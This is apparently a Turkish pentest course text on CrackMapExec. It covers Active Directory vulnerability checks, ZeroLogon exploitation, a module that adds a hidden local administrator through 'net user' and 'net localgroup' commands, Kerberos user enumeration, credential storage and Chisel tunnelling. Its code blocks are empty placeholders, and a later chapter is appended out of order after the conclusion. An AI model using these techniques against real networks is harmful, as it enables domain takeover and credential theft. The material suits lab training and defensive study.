Kimliği doğrulanmamış bir saldırgan, bir domain controller'a ağ erişimi ile[ ZeroLogon güvenlik açığından (CVE-2020-1472)](https://www.secura.com/uploads/whitepapers/Zerologon.pdf) faydalanabilir. Bu güvenlik açığını kötüye kullanmak ve sonunda domain'in controller'ı ele geçirmek için savunmasız bir Netlogon session'ı başlatması gerekir. Bir Domain Controller'a bağlanmak başarılı bir saldırı için tek ön koşul olduğundan, güvenlik açığı ciddidir.

CrackMapExec, bir Domain Controller'ın ZeroLogon'a karşı savunmasız olup olmadığını tanımlayan zerologon adlı bir modül içerir.


### ZeroLogon Güvenlik Açığı Kontrolü

{{CODE_BLOCK_220}}


### PetitPotam

Güvenlik araştırmacısı [Gilles Lionel](https://twitter.com/topotam77) kısa bir süre önce [PetitPotam](https://github.com/topotam/PetitPotam) adı verilen ve saldırganların sadece kurumsal ağ altyapısına erişim sağlayarak domain'i tehlikeye atmasına olanak tanıyan bir saldırı tekniğini ortaya çıkardı. Yöntem, sunulan herhangi bir sunucu servisine (örneğin bir Domain Controller) yönelik klasik bir `NTLM relay` saldırısıdır. Lionel ayrıca [GitHub PetitPotam](https://github.com/topotam/PetitPotam)'da saldırganların domain'i ele geçirmek için bu özel saldırı tekniğini nasıl kullanabileceklerini gösteren bir proof of  concept kodu da yayınladı.

CrackMapExec, bir Domain Controller'ın PetitPotam'a karşı savunmasız olup olmadığını tanımlayan `petitpotam` adlı bir modül içerir.


### Petitpotam Güvenlik Açığı Kontrolü

{{CODE_BLOCK_221}}


### noPAC

noPAC güvenlik açığının exploit'i, normal bir domain kullanıcısının ayrıcalıklarının bir domain admin yükseltilmesine izin verdi. Kavram kanıtı (PoC) [GitHub](https://github.com/Ridter/noPac)'da yayınlandı.

CrackMapExec, bir domain controller'ın noPAC'a karşı savunmasız olup olmadığını tanımlayan nopac adlı bir modül içerir.


### noPAC vulnerability check

{{CODE_BLOCK_222}}



### DFSCoerce

[Filip Dragovic](https://twitter.com/filip_dragovic), DFSCoerce adlı bir NTLM relay saldırısı için bir kavram kanıtı ([PoC](https://github.com/Wh04m1001/DFSCoerce)) yayınladı. Yöntem, bir Windows domain'inin controller'ı ele geçirmek için Distributed File System: Namespace Management Protocol (MS-DFSNM) kullanarak bir Windows domain'inin kontrolünü ele geçiriyor.

Bu saldırı bir domain kullanıcısı gerektirir ve bir DC'nin savunmasız olup olmadığını belirlemek için CrackMapExec modülü `dfscoerce`'yi kullanabiliriz. Bu güvenlik açığını kontrol etmek için `Y3t4n0th3rP4ssw0rd` şifresiyle `carole.holmes` hesabını kullanacağız.


### DFSCoerce Vulnerability Check

{{CODE_BLOCK_223}}


### ShadowCoerce

ShadowCoerce, güvenlik araştırmacısı Lionel Gilles tarafından 2021'in sonlarında PetitPotam saldırısını sergileyen bir sunumun sonunda keşfedildi ve ilk kez detaylandırıldı. [Charlie Bromberg](https://twitter.com/_nwodtuhs) bir kavram kanıtı ([PoC](https://github.com/ShutdownRepo/ShadowCoerce)) oluşturdu.

CrackMapExec modülü shadowcoerce kullanarak DC'nin bu saldırıya karşı savunmasız olup olmadığını kontrol etmek için carole.holmes hesabını kullanalım.


### ShadowCoerce Vulnerability Check

{{CODE_BLOCK_224}}


Güvenlik açığı tarama modüllerinin çoğu yazarı, bilgisayarın güvenlik açığı olup olmadığına dair bir mesaj eklememiştir, bu nedenle komut çalıştırıldıktan sonra hiçbir şey görmeyiz. Ancak, ( `./CrackMapExec/cme/modules/shadowcoerce.py`) adresinde bulunan shadowcoerse modülünün kaynak kodunu kontrol edersek, yazarın ( `logging.debug` ) ile bazı debug log'ları eklediğini göreceğiz. CrackMapExec'i hata debug modunda çalıştırırsak, bu logları yazdıracaktır.

CrackMapExec'i debug modunda çalıştırmak için protokolden önce `--verbose` seçeneğini kullanabiliriz


### shadowcoerce Modülünü Verbose Enabled ile Çalıştırma

{{CODE_BLOCK_225}}


`DEBUG` ile başlayan satırlar `logging.debug`'a karşılık gelir. Son satırlarda hedefin savunmasız olmadığını gösterdiğini görebiliriz.


### MS17-010 (EternalBlue)

MS17-010, diğer adıyla EternalBlue, Windows işletim sistemleri için Microsft tarafından 14 Mart 2017 tarihinde yayınlanan bir güvenlik yamasıdır. Yama, SMB servisindeki kritik bir kimliği doğrulanmamış remote kod çalıştırma açığı içindir. Bu güvenlik açığı hakkında daha fazla bilgi edinmek için [Microsoft Güvenlik Bülteni MS17-010](https://learn.microsoft.com/en-us/security-updates/SecurityBulletins/2017/ms17-010?redirectedfrom=MSDN) - Kritik'i okuyabiliriz.

CrackMapExec, bir domain controller'ın MS17-010'a karşı savunmasız olup olmadığını belirleyen ms17-010 adlı bir modül içerir.


### MS17-010 Vulnerability Check

{{CODE_BLOCK_226}}


### Güvenlik Açığından Yararlanma

Birçok güvenlik açığı gördük. Onlardan birini exploit etmeye çalışalım: ZeroLogon. Modül tarafından sağlanan bağlantıya gidelim https://github.com/dirkjanm/CVE-2020-1472 ve onu kullanalım:


### Exploiting ZeroLogon

{{CODE_BLOCK_227}}

{{CODE_BLOCK_228}}


Zaman geçtikçe yeni güvenlik açıkları ortaya çıkacaktır ve bunlar sektör uzmanları veya bizim tarafımızdan CrackMapExec'e modül olarak eklenebilir. Bir sonraki bölümde, CrackMapExec için nasıl bir modül oluşturabileceğimizi göreceğiz.

---

### Kendi CME Modülümüzü Oluşturmak

Yazarlar ve topluluk tarafından oluşturulan birçok yerleşik CrackMapExec modülünü kullandık. Bu bölümde CrackMapExec için modülümüzü nasıl yapabileceğimizi keşfedeceğiz.


### CrackMapExec'i Poetry ile derleyin

Modülümüzü oluşturmadan önce, CrackMapExec projesinin nasıl derleneceğini bilmek çok önemlidir. Bu amaçla CME, projelerimizi oluştururken önerilen [Poetry](https://python-poetry.org/)'yi kullanır. Poetry kullanmıyorsanız, CrackMapExec'i çalıştırmak üzere Poetry kullanmaya başlamak için Kurulum ve Binaryler bölümüne bir göz atın

Şimdi kodu en sevdiğimiz IDE ile açabiliriz. Bu bölümde [VSCode](https://code.visualstudio.com/) kullanacağız. VSCode'u [kurmak](https://code.visualstudio.com/download) için .deb dosyasını kendi web sitesinden indirmemiz gerekiyor. Doğrudan indirme bağlantısı [burada](https://code.visualstudio.com/sha/download?build=stable&os=linux-deb-x64).


### VSCode'un Kurulması ve Çalıştırılması

{{CODE_BLOCK_229}}

Daha sonra açmak için `code` yazabiliriz 

{{CODE_BLOCK_230}}

![Pasted image 20241203150456.png](/img/user/resimler/Pasted%20image%2020241203150456.png)


### Yeni Modülümüzü Oluşturun

Modülümüzü oluşturalım. Yeni bir administrator hesabı oluşturacak basit bir script oluşturacağız.

* ./CrackMapExec/cme/modules klasörü altında `createadmin.py` adında bir dosya oluşturun.
* Aşağıdaki kod örneğini dosyaya kopyalayın:

{{CODE_BLOCK_231}}



* Şimdi modülümüzü özelleştirelim.

Bazı değişkenleri tanımlamamız gerekiyor:

* `name`, modül adını nasıl çağıracağımızı belirtir. Bu durumda, `createadmin` dosya adını kullanacağız.
* `description` modülün amacı için kısa bir açıklamadır. Biz bunu `Create a new administrator account` ayarlayacağız.
* `supported_protocols`, modülü kullanmak için desteklenen protokolün bir dizisidir. Biz sadece `SMB` kullanacağız.
* `opsec_safe`, modülün çalıştırılmasının güvenli olduğu anlamına gelen bir `True` veya `False` değeridir.
* `multiple_hosts`, bu modülü birden fazla hedefe karşı çalıştırabileceğimiz anlamına gelir.

Ayrıca, modül için değişkenleri tanımlamak için kullanılan `options()` methoduna da sahip olacağız. Bu durumda, `USER` ve `PASS` olmak üzere iki seçenek ekleyeceğiz. Her seçeneğin varsayılan değeri olabilir ya da olmayabilir. Bu yazara bağlıdır. USER için varsayılan değeri düz metin olarak ve PASS için varsayılan değeri `asdasd123` . Ayrıca USER o PASS modül seçeneğinin boş olup olmadığını doğrulamak için bir kontrol ekledik. Eğer durum buysa, modülden çıkılacaktır.

{{CODE_BLOCK_232}}

* Daha sonra, `on_admin_login()` metodunu kullanarak execute ile çalışacağız. Bu metot değişkenlerimizi almaktan ve hedeflere istediğimiz herhangi bir görevi yürütmekten sorumludur. Çıktı olarak `context.log.info` ve `context.log.highlight` metotlarını kullanacağız (farklı renklere sahipler).

Bu execute için, yöntemin `connection.execute(command, True)` komutunu kullanarak bir `cmd.exe` komutu çalıştıracağız. Komutumuz, yeni bir kullanıcı eklemek için `net user username password /add /Y` değeriyle ve kullanıcıyı administrators grubuna eklemek için `net localgroup administrators username /add` değeriyle command değişkenine kaydedilecektir.

{{CODE_BLOCK_233}}


Son olarak, yeni modülümüz şu şekilde görünmelidir:

{{CODE_BLOCK_234}}


### Modülümüzü Çalıştırma

Şimdi modülümüzü herhangi bir seçenekle veya herhangi bir seçenek olmadan çalıştırabiliriz. Önce varsayılan değerlerle çalıştırarak sonuçları görelim.


### CME Modülümüzün Çalıştırılması createadmin

{{CODE_BLOCK_235}}

Daha sonra, hem kullanıcı adı hem de parola belirterek çalıştırabiliriz.

{{CODE_BLOCK_236}}


İlk modülümüz çalışıyor, ancak çok daha iyi olabilir. Yürütmeyi iki komuta bölebilir ve kullanıcı zaten oluşturulmuşsa veya şifre politikalara uymuyorsa bir hata gösterebiliriz.

Ayrıca `context.log.highlight(p)`'den değeri alabilir ve bir hata varsa farklı bir şey gösterebiliriz. Bu kodu geliştirmek için fikirleriniz nelerdir?

### Diğer Yazarlardan Öğrenmek

Artık yeni bir modül oluşturmanın temellerini öğrendiğimize göre, diğer modülleri keşfetmeli ve birkaç fikir edinmeliyiz.

Örneğin, `procdump.py` modülü `procdump.exe` çalıştırılabilir dosyasını bir `Base64` string olarak kaydeder, ardından Base64 stringini bir dosyaya dönüştürür ve hedef işletim sisteminde tutar. LSASS'ın işlem kimliğini almak için `tasklist` komutunu çalıştırır, bunu bir değişkene kaydeder ve process kimliğini procdump.exe'nin yürütülmesine bir argüman olarak geçirir.

Başka bir örnek `get_description.py` . Bu modülü `groupmembership` modülünü oluşturmak için örnek olarak aldık. Bu modül, bir sorgu gerçekleştirmek ve `memberOf` attribute'unu almak için ihtiyaç duyduğumuz gibi, sonuçlarını bir LDAP sorgusuna dayalı olarak alır. Kodda bazı değişiklikler yaptık, yeni bir modül oluşturduk ve bir pull request gönderdik. Pull request kabul edildikten sonra tüm topluluk tarafından kullanılabilir olacaktır.

Yeni modüller oluşturmak için MSSQL gibi diğer protokoller için başka örneklere de bakabiliriz.


### Pull Request Oluşturma

CrackMapExec gibi bir proje topluluk tarafından canlı tutulur. Modülümüzün tüm topluluk tarafından kullanılabilir hale geleceği ve aracın kendisinin bir parçası olarak dahil edileceği bir pull request'i ekleyerek projeye katkıda bulunabiliriz.

Bir pull request'i yapmak için [GitHub](https://docs.github.com/en/pull-requests/collaborating-with-pull-requests/proposing-changes-to-your-work-with-pull-requests/creating-a-pull-request) kılavuzunu takip edebilir ve CrackMapExec'e katkıda bulunabiliriz.

İlerleyen bölümlerde, CrackMapExec kullanımı için `IPv6`, `Kerberos Kimlik Doğrulama` ve `CrackMapExec` veritabanında uzmanlaşma gibi bazı bonus konuları tartışacağız.


### Ek CME İşlevselliği

CrackMapExec, çeşitli senaryolarda çok faydalı olacak başka yardımcı programlara da sahiptir. Bu bölümde, bunlardan üçünü inceleyeceğiz:

* Audit mode
* IPv6 desteği
* Birden fazla cihaza saldırırken tamamlanma yüzdesi

### Audit Mode

5.3.0 sürümünde yeni bir mod eklendi: `audit modu`. Bu mod, şifreyi veya hash'i tercih ettiğimiz bir karakterle veya hatta en sevdiğimiz `emoji` ile değiştirir. Bu özellik, bir müşteri raporu yazarken ekran görüntüsünün bulanıklaşmasını önlemeye yardımcı olur.

Audit modunu yapılandırmak için, varsayılan olarak `~/.cme/cme.conf` adresinde bulunan yapılandırma dosyasını düzenlememiz ve `audit_mode` parametresini tercih ettiğimiz karakterle değiştirmemiz gerekir. Bu karakter, CrackMapExec çalıştırılırken parolanın veya hash'in yerini alacaktır. Bu örnek için `#` karakterini kullanacağız


### Enabling Audit Mode

{{CODE_BLOCK_237}}

Şimdi çalıştırabilir ve parolanın çıktıda `########` ile değiştirildiğini görebiliriz.

{{CODE_BLOCK_238}}

Gördüğümüz gibi, çalıştırma sonucundaki password `#` karakteri ile değiştirilir. Ancak, komut şifreyi gösterir. Bu gibi durumlarda, istenen komutu çalıştırmadan önce parolayı bir dosyaya kaydetmek idealdir.

### Audit Mode Dosyadaki Parola ile Etkinleştirildi

{{CODE_BLOCK_239}}


### IPv6 Support

CrackMapExec'in bir diğer yeteneği, IPv6 üzerinden iletişimi desteklemesidir. Çoğu organizasyon, IPv6'yı varsayılan olarak etkinleştirmiştir, hatta bunu kullanmasalar bile, IPv6'nın log seviyesinde IPv4 kadar izlenmediği veya anlaşılmadığı durumlar da olabilir. Bu durum, ağ saldırılarının gerçekleştirilmesi ve tespit edilmeden geçmesi için bir fırsat yaratır.

Popüler modüller bölümünde gördüğümüz gibi, CrackMapExec, `get_netconnections` modülüyle bilgisayarların IPv6 adreslerini belirlememize olanak tanır. Bu modülü kullanarak IPv6 üzerinden komutu çalıştırmayı deneyelim.

### get_netconnections Modülünü Çalıştırma ve IPv6 Kullanma

{{CODE_BLOCK_240}}

Şimdi IPv6 üzerinden hedefe erişelim.

{{CODE_BLOCK_241}}



### Tamamlanma Yüzdesi

Artık bir tarama çalışırken enter tuşuna basabilirsiniz ve CME size tamamlanma yüzdesini ve taranacak kalan host sayısını verecektir. Bu modül laboratuvarında her seferinde bir host'a saldırıyoruz, ancak daha kapsamlı bir ağ bulduğunuzda, büyük olasılıkla bu özelliği kullanacaksınız. Şimdilik `--shares` seçeneğini çalıştıralım ve bitmeden önce enter tuşuna basalım.


### Tamamlanma Yüzdesi

{{CODE_BLOCK_242}}

Aşağıdaki bölümde, Kerberos kimlik doğrulamasını ve CrackMapExec'in bu kimlik doğrulama yöntemi için içerdiği yeni değişiklikleri tartışacağız.

---


### Kerberos Authentication

Yazma sırasında CrackMapEec, `SMB`, `LDAP` ve `MSSQL` protokolleri için Kerberos Kimlik Doğrulamasını desteklemektedir. Kerberos Kimlik Doğrulamasını kullanmanın iki (2) yolu vardır:

* `ccache` dosyasını belirtmek için `KRB5CCNAME` env adını kullanma. 
* CrackMapExec 5.4.0'dan başlayarak, artık Kerberos kimlik doğrulaması için bir Ticketla `KRB5CCNAME` environment variable'ını kullanmamız gerekmiyor. Bir kullanıcı adı ve parola veya kullanıcı adı ve hash kullanabiliriz.

Linux'ta Kerberos kimlik doğrulamasını kullanırken göz önünde bulundurulması gereken önemli bir unsur, saldırdığımız bilgisayarın domain ve hedef makinenin `FQDN`'sini çözümlemesi gerektiğidir. İnternal bir ağdaysak, bilgisayarımızı şirketin DNS'sine domain adı çözümlemeleri yapacak şekilde yapılandırabiliriz, ancak durum böyle değildir. DNS'i yapılandıramayız ve `/etc/hosts` dosyasına domain controller ve hedef makinemiz için FQDN'i manuel olarak eklememiz gerekecektir.


### Setting Up the /etc/hosts File

{{CODE_BLOCK_243}}

{{CODE_BLOCK_244}}

CrackMapExec'i Kerberos kimlik doğrulaması ile kullanmayı deneyelim.

### Username and Password - Kerberos Authentication

CrackMapExec'i `-k` veya `--kerberos` seçeneği olmadan bir kullanıcı adı ve parola veya kullanıcı adı ve hash ile kullandığımızda, NTLM kimlik doğrulaması gerçekleştiririz. Kerberos seçeneğini kullanırsak bunun yerine Kerberos kimlik doğrulamasını kullanabiliriz.

### Kerberos Authentication

{{CODE_BLOCK_245}}




### Kerberos Kimlik Doğrulaması ile Kullanıcıları Tanımlama

Yeni Kerberos kimlik doğrulama uygulaması ile CrackMapExec, CME içinde kendi `Kerbrute`'unu oluşturmak için tüm bileşenlere sahiptir. Bu, CME'nin bir kullanıcının domain üzerinde var olup olmadığını ve bu kullanıcının Kerberos `pre-authentication` (`ASREPRoasting`) gerektirmeyecek şekilde yapılandırılıp yapılandırılmadığını anlayabileceği anlamına gelir. Bunu aşağıdaki hesaplarla çalışırken görelim: `account_not_exist` , `julio` , ve `robert` .


### Kerberos Kimlik Doğrulaması ile Kullanıcıları Tanımlama

{{CODE_BLOCK_246}}

Gördüğümüz gibi, `Kerbrute` CrackMapExec TGT isteklerini ön kimlik doğrulaması olmadan gönderdiğinden, KDC bir KDC_ERR_C_PRINCIPAL_UNKNOWN hatasıyla yanıt verirse, kullanıcı adı mevcut değildir. Ancak, KDC pre-authentication isterse, `KDC_ERR_PREAUTH_FAILED` hatasıyla yanıt verir, bu da kullanıcı adının mevcut olduğu anlamına gelir. Son olarak, `asreproast` saldırısına karşı savunmasız bir hata hesabı görürsek, daha önce `AESREPRoast` Hesaplarını Bulma bölümünde gördüğümüz gibi AESREPoast saldırılarına karşı hassastır.

Bu, oturum açma hatalarına neden olmaz, bu nedenle herhangi bir hesabı kilitlemez, ancak Kerberos logu etkinleştirilmişse [4768](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4768) numaralı bir Windows olay kimliği oluşturur.


### AES-128 veya AES-256 kullanma

Ayrıca, Kerberos Kimlik Doğrulaması için AES-128 veya AES-256 hash'leri de kullanabiliriz. `Impacket`'ten `Secretsdump` gibi araçlar, genellikle bu tür hash'leri alabilir. AES-128 veya AES-256 kullandığımızda, trafiğimiz normal Kerberos trafiğine daha çok benzeyecek ve bu da operasyonel bir avantaj (opsec) sağlayacaktır. Hadi Secretsdump'u kullanalım ve ardından AES256 ile kimlik doğrulaması yapalım.


### AES256 ile Kimlik Doğrulama

{{CODE_BLOCK_247}}

{{CODE_BLOCK_248}}


### CCache file - Kerberos Authentication

Bir credential cache (veya [ccache](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) ) Kerberos kimlik bilgilerini tutar. Genellikle kullanıcının oturumu sürdüğü sürece geçerli kalırlar, bu nedenle servislere birden fazla kez kimlik doğrulaması yapmak (örneğin, bir web veya posta sunucusuna birden fazla kez bağlanmak) her seferinde KDC ile iletişim kurmayı gerektirmez.

Çoğu durumda, Linux makineleri Kerberos tickerları ccache dosyaları olarak depolar, sistemlerin ticketları kullanma şekli, `ccache` dosyasının yolunu gösteren `KRB5CCNAME` environment variable aracılığıyla olur. robert kullanıcısı için bir ticket (ccache dosyası) oluşturalım ve DC01'e kimlik doğrulaması yapalım

Ticket'ı oluşturmak için [getTGT.py](https://github.com/fortra/impacket/blob/master/examples/getTGT.py) impacket aracını kullanacağız ve KRB5CCNAME environment variable'i getTGT.py tarafından oluşturulan ccache dosyasının yoluna ayarlayacağız.


### Ticket Granting Tickets

{{CODE_BLOCK_249}}

{{CODE_BLOCK_250}}

Kerberos kimlik doğrulama yöntemimiz olarak `KRB5CCNAME` environment variable'ini kullanmak için `--use-kcache` seçeneğini kullanmamız gerekir. Kullanıcı adı ve parola seçenekleri gerekli değildir.


### ccache Dosyasını Kerberos Kimlik Doğrulama Yöntemi Olarak Kullanma (SMB Protokolü)

{{CODE_BLOCK_251}}


### Kerberos Kimlik Doğrulama Yöntemi Olarak ccache Dosyasının Kullanılması (LDAP Protokolü)

{{CODE_BLOCK_252}}

Kerberos Kimlik Doğrulamasını `MSSQL` protokolü ile kullanmak için hedef olarak IP adresi yerine bilgisayar adını veya FQDN'yi belirtmemiz gerekir. Bunun nedeni, MSSQL protokolünün perde arkasında IP'yi FQDN'ye dönüştürmemesi, ancak SMB ve LDAP protokollerinin bunu yapmasıdır.


### MSSQL Protokolü ile ccache Dosyasını Kullanma

{{CODE_BLOCK_253}}

Kullanıcı adları ve parolalarla yaptığımız gibi Kerberos kimlik doğrulaması ile herhangi bir modülü veya seçeneği çalıştırabiliriz


### Kerberos Kimlik Doğrulaması ile Paylaşımları Listeleme


{{CODE_BLOCK_254}}


CrackMapExec ile Kerberos Authentication'ın nasıl kullanılacağını öğrendik. Aşağıdaki bölümde, CrackMapExec veritabanı `cmedb` ile etkileşime gireceğiz

---


### CMEDB'de Uzmanlaşmak

CME otomatik olarak tüm kullanılan/dump edilen kimlik bilgilerini (diğer bilgilerle birlikte) ilk çalıştırmada kurulan `SQLite` veritabanında saklar. Tüm çalışma alanları ve ilgili veritabanları `~/.cme/workspaces` içinde saklanır. Varsayılan veritabanları `~/.cme/workspaces/default` dizininde bulunur. Bu dizinde her protokol için bir SQLite dosyası bulunur.


### Varsayılan Veritabanlarını Listeleme

{{CODE_BLOCK_255}}

### Veritabanı ile Etkileşim

CME, back-end veritabanı ile etkileşimi kolaylaştıran ikinci bir komut satırı script'i olan `cmedb` ile birlikte gelir. cmedb komutunu yazmak bizi bir komut shell'i götürecektir:

### CMEDB

{{CODE_BLOCK_256}}


### Workspaces

Varsayılan workspace adı `default` olarak adlandırılır (bilgi `prompt` gösterildiği gibi). Bir workspace seçildiğinde, CME'de yaptığımız her şey bu workspace'de saklanacaktır. Bir workspace oluşturmak için, `cmedb (default) >` komut promt root'una gitmemiz gerekir. Eğer protokol veritabanındaysak, geri komutunu kullanmamız gerekir.


### Creating a Workspace

{{CODE_BLOCK_257}}

Workspace'leri listelemek için `workspace list` , workspace'i değiştirmek için ise `workspace <workspace>` yazabiliriz.


### Workspace'leri Listeleme ve Değiştirme

{{CODE_BLOCK_258}}


### Bir Protokolün Veritabanına Erişim

cmedb her protokol için bir veritabanına sahiptir, ancak bu modülün yazıldığı sırada yalnızca `SMB` ve `MSSQL` yararlı seçeneklere sahiptir:

| Protokol | Seçenekler                                         |
| -------- | -------------------------------------------------- |
| SMB      | back exit export import groups hosts import shares |
| MSSQL    | back exit export import host import                |
| LDAP     | back exit export import                            |
| WinRM    | back exit export import                            |
| RDP      | back exit export import                            |
| FTP      | back exit export import                            |
| SSH      | back exit export import                            |

Bir protokolün veritabanına erişmek için `proto` `<protocol>` komutunu çalıştırın. Protokol içinde, mevcut seçenekleri görüntülemek için `help` seçeneğini kullanabiliriz:

### SMB Protokol Veritabanına Bağlanma

{{CODE_BLOCK_259}}


### Protocol Options

SMB veya MSSQL protokolünü her kullandığımızda, kimlik bilgileri, saldırdığımız hostlar, eriştiğimiz paylaşımlar ve listelediğimiz gruplar CrackMapExec veritabanında saklanır. Veritabanında sahip olduğumuz verilere erişelim.

### Kimlik Bilgilerini Görüntüleme

CrackMapExec veritabanı, CrackMapExec kullanarak kullandığımız veya elde ettiğimiz tüm kimlik bilgilerini depolar. Bu veritabanı, kimlik bilgilerinin türünü, `düz metin` veya `hash` olup olmadığını, domain, kullanıcı adı ve şifreyi saklar. SMB protokolünün kimlik bilgilerini görmek için protokol içindeki `creds` seçeneğini kullanmamız gerekir.


### Displaying SMB Credentials

{{CODE_BLOCK_260}}


Gördüğünüz gibi, creds'ten sonra bir `kullanıcı adı` ekleyerek belirli kullanıcıları da sorgulayabiliriz. Ayrıca `creds hash` seçeneği ile tüm hash'leri veya `creds plaintext` seçeneği ile tüm plaintext kimlik bilgilerini listeleyebiliriz.


### Hash'leri ve Düz Metin Kimlik Bilgilerini Görüntüleme

{{CODE_BLOCK_261}}


Not: cmedb, mevcut seçenekleri görüntülemek için sekme otomatik tamamlamaya izin verir

MSSQL kimlik bilgileri MSSQL protokolüne kaydedilir ve SMB kimlik bilgilerini görüntülediğimiz gibi görüntülenebilir


### MSSQL için Kimlik Bilgilerini Görüntüleme

{{CODE_BLOCK_262}}

Not: Domain alanını bir bilgisayar ile görüyorsak, bu bir MSSQL hesabı kullandığımız anlamına gelir.

### Kimlik Bilgilerini Kullanma

CrackMapExec'i çalıştırmak için veritabanındaki kimlik bilgilerini de kullanabiliriz. Kullanmak istediğimiz kimlik bilgilerini tanımlamamız ve hangi id'nin hesapla ilişkili olduğunu belirlememiz gerekir. `Julio`'nun kimlik bilgilerini `id 4` ile kullanalım. Kullanıcı adı ve parola yerine bir kimlik bilgisi kullanmak için `-id CredID` seçeneğini kullanmamız gerekir.

### CrackMapExec ile Etkileşim için CredID Kullanımı

{{CODE_BLOCK_263}}


### Hosts Information

MSSQL ve SMB için, erişim sağladığımız bilgisayarları, IP'lerini, domainlerini ve işletim sistemlerini de belirleyebiliriz.


### Displaying Hosts

{{CODE_BLOCK_264}}


### Share Information

CME veritabanı da belirlediğimiz paylaşımlı klasörleri saklıyor ve okuma ve yazma erişimine sahip kullanıcılarımız olup olmadığını bize söylüyor. Paylaşım bilgilerine erişmek için `cmedb` içerisinde SMB protokolü içerisinde `shares` seçeneğini kullanmamız gerekiyor.

### Paylaşımları Geri Alma

{{CODE_BLOCK_265}}


### Kullanıcı Ekleme ve Kaldırma

CME, kullanıcıları veritabanından manuel olarak ekleme veya kaldırma özelliğini destekler. Protokolü (SMB veya MSSQL) seçiyoruz ve `creds add` veya `creds remove` kullanıyoruz.


### cmedb'ye Kullanıcı Ekleme

{{CODE_BLOCK_266}}

Şimdi eklediğimiz kullanıcıyı kaldırmayı deneyebiliriz.

### Bir Kullanıcıyı cmedb'den Kaldırma

{{CODE_BLOCK_267}}


### Empire Kimlik Bilgilerini İmport Etme

cmedb'nin sahip olduğu bir başka özellik de `Empire`'dan kimlik bilgilerini import etme yeteneğidir.


### Import from Empire

{{CODE_BLOCK_268}}

Not: Bu özelliği kullanmak istiyorsanız `Empire`'ı yapılandırdığınızdan emin olun

### Export cmedb Data

CrackMapExec veritabanından kimlik bilgilerini, hostları, local adminleri ve paylaşımları export edebiliriz.

### Kimlik Bilgilerini cmedb'den Export Etme

{{CODE_BLOCK_269}}

{{CODE_BLOCK_270}}

Veriler CSV dosyası olarak dışa aktarılır. `LibreOffice` veya `Excel` gibi araçları kullanarak açabiliriz.

![Pasted image 20241203155509.png](/img/user/resimler/Pasted%20image%2020241203155509.png)


### Son

CrackMapExec, ağ güvenliği testlerinde ve sızma testlerinde kullanıcıların işini kolaylaştıran, etkili bir araçtır. Geniş protokol desteği, hızlı keşif, güvenlik açıkları tespiti ve yönetimsel haklar elde etme gibi çeşitli özellikleriyle güvenlik profesyonellerinin vazgeçilmez araçları arasında yer alır. Bu araç, ağ yapılarının daha güvenli hale getirilmesi için önemli bir rol oynar ve her güvenlik uzmanının repertuarında bulunması gereken bir araçtır.


, 'print

Dizine gidebilir ve kullanıcının erişebileceği tüm dosyaların bir listesini alabiliriz:


### Kullanıcının Kullanabileceği Dosyaları Listeleme

{{CODE_BLOCK_94}}

Eğer paylaşımın tüm içeriğini indirmek istiyorsak `READ_ONLY=false` seçeneğini aşağıdaki gibi kullanabiliriz:

{{CODE_BLOCK_95}}

{{CODE_BLOCK_96}}

Not: Sabırlı olmamız gerekiyor. Paylaşılan klasör ve dosya sayısına bağlı olarak işlem birkaç dakika sürebilir

`spider_plus` modülü için mevcut tüm seçenekleri görüntülemek için `--options` seçeneğini kullanabiliriz:


### Spider_plus Options

{{CODE_BLOCK_97}}

Bir sonraki bölümde CrackMapExec'in bir `proxy` aracılığıyla diğer ağlara ulaşmak için nasıl kullanılacağı anlatılacaktır.


---


### Proxychains with CME

### Scenario

İnternal bir Pentest üzerinde çalışıyoruz. Bir ağ taraması gerçekleştirdik ve yalnızca bir host (10.129.204.133) tespit edip ele geçirebildik. Ele geçirilen bu host üzerinde `ipconfig` çalıştırdığımızda, iki ağ bağdaştırıcısı olduğunu fark ettik. ARP tablosu `172.16.1.10` IP adresine sahip başka bir hostu gösteriyor. Topladığımız bilgilere dayanarak aşağıdaki senaryoya sahibiz:

![Pasted image 20241202141946.png](/img/user/resimler/Pasted%20image%2020241202141946.png)

DC01'e ve bu ağdaki (172.16.1.0/24) herhangi bir makineye saldırmak için, saldırı hostumuz ile MS01 arasında bir `tünel` kurmalıyız. Bu nedenle, CME tarafından yürütülen tüm komutlar MS01 üzerinden geçer.


### Set Up the Tunnel

Tünelimizi kurmak için [Chisel](https://github.com/jpillora/chisel) kullanacağız. [Release](https://github.com/jpillora/chisel/releases)'e gidelim ve saldıracağımız makinemiz için en son Windows binary'sini ve saldırı hostumuzda kullanmak için en yeni Linux binary'sini indirelim ve aşağıdaki adımları gerçekleştirelim:

*  Chisel'ı Saldırı Hostumuza indirin ve Çalıştırın:

### Chisel - Reverse Tunnel

{{CODE_BLOCK_98}}


*  Chisel for Windows'u İndirin ve Hedef Host'a Yükleyin:


### Upload Chisel

{{CODE_BLOCK_99}}


* CrackMapExec komut yürütme seçeneği `-x`'i kullanarak Chisel sunucumuza bağlanmak için `chisel.exe` dosyasını çalıştırın (Bu seçeneği Komut Yürütme bölümünde daha fazla tartışacağız)


### Connect to the Chisel Server

{{CODE_BLOCK_100}}

Bu terminaldeki komut, hedef makinadaki **Chisel** process'ini durdurana kadar çalışmaya devam edecektir. Bunu bu bölümde daha sonra yapacağız.

**Attack host** üzerinde, **Chisel server** çıktısında **bir client bağlantısı aldığımızı ve tüneli başlattığımızı** gösteren yeni bir satır görmeliyiz.

### Chisel Receiving Session No. 1

{{CODE_BLOCK_101}}

TCP 1080 portunun dinlenip dinlenmediğini kontrol ederek de tünelin çalıştığını doğrulayabiliriz:


### Check Listening Port

{{CODE_BLOCK_102}}

* Proxyychains'i Chisel varsayılan portu `TCP 1080`'i kullanacak şekilde yapılandırmamız gerekir. Yapılandırma dosyasının ProxyList bölümüne `socks5 127.0.0.1 1080`'i aşağıdaki gibi eklediğimizden emin olmamız gerekiyor:


### Configure Proxychains

{{CODE_BLOCK_103}}

* Artık 172.16.1.10 IP'sine ulaşmak için `Proxychains` aracılığıyla CrackMapExec'i kullanabiliriz:

### CrackMapExec'in Proxychains ile Test Edilmesi

{{CODE_BLOCK_104}}


Proxychains çıktısını konsoldan kaldırmak için `Proxychains4` ve `quiet -q` seçeneğini kullanabiliriz:

### Quiet Seçeneği ile Proxychains4

{{CODE_BLOCK_105}}

Proxychains aracılığıyla herhangi bir CME işlemi gerçekleştirebiliriz.


### Killing Chisel on the Target Machine

